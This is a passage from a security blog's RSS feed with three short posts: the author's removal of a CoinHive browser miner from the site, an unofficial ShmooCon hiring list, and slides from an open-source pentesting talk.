      <pubDate>Mon, 09 Jul 2018 11:30:44 -0500</pubDate>
      
      <guid>https://malicious.link/post/2018/a-few-changes/</guid>
      <description>&lt;p&gt;For nearly a year I left a CoinHive miner up on the blog so that people that didn&amp;rsquo;t feel like or couldn&amp;rsquo;t afford a way to support the blog could do so via a bit of CPU power. Unfortunately during that time lots of malware started to use services like coinhive and I quickly started recieving warning that my site had been &amp;ldquo;hacked&amp;rdquo; or was showing up as malicious (har har). Well, finally got off my butt and removed it. Sorry to my readers who had to deal with it.&lt;/p&gt;

&lt;p&gt;More later! Lots of fun stuff to come.&lt;/p&gt;
</description>
    </item>
    
    <item>
      <title>2018 ShmooCon Hiring List</title>
      <link>https://malicious.link/post/2017/2018-shmoocon-hiring-list/</link>
      <pubDate>Thu, 28 Dec 2017 09:30:44 -0500</pubDate>
      
      <guid>https://malicious.link/post/2017/2018-shmoocon-hiring-list/</guid>
      <description>&lt;p&gt;&lt;center&gt;&lt;iframe width=&#34;405&#34; height=&#34;208&#34; src=&#34;https://w2.countingdownto.com/2049915&#34; frameborder=&#34;0&#34;&gt;&lt;/iframe&gt;&lt;/center&gt;&lt;/p&gt;

&lt;p&gt;Created the 2018 UNOFFICIAL &lt;a href=&#34;http://shmoocon.org/&#34;&gt;ShmooCon&lt;/a&gt; Hiring List. To get on the list is even easier now! Just complete the following form: &lt;a href=&#34;https://goo.gl/forms/aDRYaH5wubSqWcUk1&#34;&gt;https://goo.gl/forms/aDRYaH5wubSqWcUk1&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;(One small tip, first come first serve, so if you want to be on the top of the list it&amp;rsquo;s best to submit the best info you have vs waiting on anyone, I don&amp;rsquo;t change the list order for anyone.)&lt;/p&gt;

&lt;p&gt;Direct Link to Google Doc: &lt;a href=&#34;https://docs.google.com/spreadsheets/d/10BXjzS1KsaWFkQkAjlox3Chrk5wD1lgUf1RWi50Jiso/&#34;&gt;https://docs.google.com/spreadsheets/d/10BXjzS1KsaWFkQkAjlox3Chrk5wD1lgUf1RWi50Jiso/&lt;/a&gt;&lt;/p&gt;

&lt;iframe height=&#34;3900&#34; width=&#34;900&#34; src=&#34;https://docs.google.com/spreadsheets/d/e/2PACX-1vQotxxtoByz-ZvGipDrgRc2DqSkjlcJjMLaHvqY1vYQMY0r7pWMQCteniEE9ef-cyHEWugdTYbbu8Y5/pubhtml?gid=0&amp;amp;single=true&amp;amp;widget=true&amp;amp;headers=false&#34;&gt;&lt;/iframe&gt;
</description>
    </item>
    
    <item>
      <title>Open Source Pentesting</title>
      <link>https://malicious.link/post/2017/open-source-pentesting/</link>
      <pubDate>Fri, 27 Oct 2017 09:30:44 -0500</pubDate>
      
      <guid>https://malicious.link/post/2017/open-source-pentesting/</guid>
      <description>&lt;p&gt;My talk today at &lt;a href=&#34;http://wildwesthackinfest.com/&#34;&gt;Wild West Hacking Fest&lt;/a&gt; was about some documents that I released here. I&amp;rsquo;ll make this blog post more indepth later but for right now I wanted to get the slides out.&lt;/p&gt;

&lt;p&gt;(If you can&amp;rsquo;t access one of the documents yet, don&amp;rsquo;t ask for permission to do so, it just means either they aren&amp;rsquo;t ready yet, I&amp;rsquo;ll make posts about each one as they become available)&lt;/p&gt;

&lt;p&gt;Here is the main slide deck for the docs: &lt;a href=&#34;https://bit.ly/OpenSourcePentest&#34;&gt;https://bit.ly/OpenSourcePentest&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;Here are the slides for the release talk (not the same as the link above):&lt;/p&gt;

&lt;iframe src=&#34;https://docs.google.com/presentation/d/e/2PACX-1vRuow-CSzZ7VCmUePL2uPKJUZ7fbGskHpFjKgWwpARTGr9crbgJnWCamA6Yg20K02uWDpQotGOXucPg/embed?start=true&amp;loop=true&amp;delayms=3000&#34; frameborder=&#34;0&#34; width=&#34;960&#34; height=&#34;569&#34; allowfullscreen=&#34;true&#34; mozallowfullscreen=&#34;true&#34; webkitallowfullscreen=&#34;true&#34;&gt;&lt;/iframe&gt;
</description>
    </item>
    
  </channel>
</rss>
